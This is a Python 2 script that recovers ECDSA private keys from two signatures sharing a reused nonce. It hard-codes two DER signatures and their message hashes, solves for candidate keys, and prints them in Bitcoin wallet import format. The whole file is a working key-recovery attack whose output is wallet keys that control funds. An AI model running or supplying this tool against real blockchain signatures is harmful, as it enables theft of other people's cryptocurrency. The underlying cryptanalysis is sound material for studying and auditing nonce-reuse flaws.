#!/usr/bin/env python

import hashlib

p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
#r  = 0xa77e0e01b69987421b4a58935130cbd80f4ac65ec33b6232248235fcd8708e7c
#s1 = 0x44e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e
#s2 = 0x9a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab
z1 = 0x75c991a64fa69368d1988c2ad6f885b17b8a69868763852b2c86aacc6b4745e8
z2 = 0x5e3f128174bd4f0cd503ec82004467cc605265c950cae88ca9f247419bee5610

# r1 and s1 are contained in this ECDSA signature encoded in DER (openssl default).
der_sig1 = "3044022035e4dd6e4d56638eee57fddf6af2d9f8a1cd8ae35d8e304b175f8c5ec0d80f6f022024e0255335dc10284b3df9feadd1edc2bfb0540c03d1dbc09d65a84179f3b3a701"

# the same thing with the above line.
der_sig2 = "3044022035e4dd6e4d56638eee57fddf6af2d9f8a1cd8ae35d8e304b175f8c5ec0d80f6f02202b1c3c17b3d13a8e6c9ad6a75743feb2040dff9d741e53c7c5564baba7a09acb01"

params = {'p':p,'sig1':der_sig1,'sig2':der_sig2,'z1':z1,'z2':z2}

def hexify (s, flip=False):
    if flip:
        return s[::-1].encode ('hex')
    else:
        return s.encode ('hex')

def unhexify (s, flip=False):
    if flip:
        return s.decode ('hex')[::-1]
    else:
        return s.decode ('hex')

def inttohexstr(i):
	tmpstr = hex(i)
	hexstr = tmpstr.replace('0x','').replace('L','').zfill(64)
	return hexstr

b58_digits = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def dhash(s):
    return hashlib.sha256(hashlib.sha256(s).digest()).digest()

def rhash(s):
    h1 = hashlib.new('ripemd160')
    h1.update(hashlib.sha256(s).digest())
    return h1.digest()

def base58_encode(n):
    l = []
    while n > 0:
        n, r = divmod(n, 58)
        l.insert(0,(b58_digits[r]))
    return ''.join(l)

def base58_encode_padded(s):
    res = base58_encode(int('0x' + s.encode('hex'), 16))
    pad = 0
    for c in s:
        if c == chr(0):
            pad += 1
        else:
            break
    return b58_digits[0] * pad + res

def base58_check_encode(s, version=0):
    vs = chr(version) + s
    check = dhash(vs)[:4]
    return base58_encode_padded(vs + check)

def get_der_field(i,binary):
        if (ord(binary[i]) == 02):
                length = binary[i+1]
                end = i + ord(length) + 2
                string = binary[i+2:end]
                return string
        else:
                return None

# Here we decode a DER encoded string separating r and s
def der_decode(hexstring):
        binary = unhexify(hexstring)
        full_length = ord(binary[1])
        if ((full_length + 3) == len(binary)):
                r = get_der_field(2,binary)
                s = get_der_field(len(r)+4,binary)
                return r,s
        else:
                return None

def show_results(privkeys):
		print "Posible Candidates..."
		for privkey in privkeys:
        		hexprivkey = inttohexstr(privkey)
			print "intPrivkey = %d"  % privkey
			print "hexPrivkey = %s" % hexprivkey
			print "bitcoin Privkey (WIF) = %s" % base58_check_encode(hexprivkey.decode('hex'),version=128)
			print "bitcoin Privkey (WIF compressed) = %s" % base58_check_encode((hexprivkey + "01").decode('hex'),version=128)


def show_params(params):
	for param in params:
		try:
			print "%s: %s" % (param,inttohexstr(params[param]))
		except:
			print "%s: %s" % (param,params[param])

def inverse_mult(a,b,p):
	y =  (a * pow(b,p-2,p))  #(pow(a, b) modulo p) where p should be a prime number
	return y

# Here is the wrock!
def derivate_privkey(p,r,s1,s2,z1,z2):

	privkeys = []

	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1-s2)),p) % int(p)))
	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1+s2)),p) % int(p)))
	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1-s2)),p) % int(p)))
	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1+s2)),p) % int(p)))

	privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(s1-s2)),p) % int(p)))
        privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(s1+s2)),p) % int(p)))
        privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(-s1-s2)),p) % int(p)))
        privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(-s1+s2)),p) % int(p)))

	return privkeys

def process_signatures(params):

	p = params['p']
	sig1 = params['sig1']
	sig2 = params['sig2']
	z1 = params['z1']
	z2 = params['z2']

	tmp_r1,tmp_s1 = der_decode(sig1) # Here we extract r and s from the signature encoded in DER.
	tmp_r2,tmp_s2 = der_decode(sig2) # Idem.

	# the key of ECDSA are the integer numbers thats why we convert hexa from to them.
	r1 = int(tmp_r1.encode('hex'),16)
	r2 = int(tmp_r2.encode('hex'),16)
	s1 = int(tmp_s1.encode('hex'),16)
	s2 = int(tmp_s2.encode('hex'),16)

	if (r1 == r2): # If r1 and r2 are equal the two signatures are weak and we can recover the private key.
 		if (s1 != s2): # This: (s1-s2)>0 should be complied in order be able to compute the private key.
			privkey = derivate_privkey(p,r1,s1,s2,z1,z2)
			return privkey
		else:
			raise Exception("Privkey not computable: s1 and s2 are equal.")
	else:
		raise Exception("Privkey not computable: r1 and r2 are not equal.")

def main():
	show_params(params)
	privkey = process_signatures(params)
	if len(privkey)>0:
		show_results(privkey)

if __name__ == "__main__":
    main()
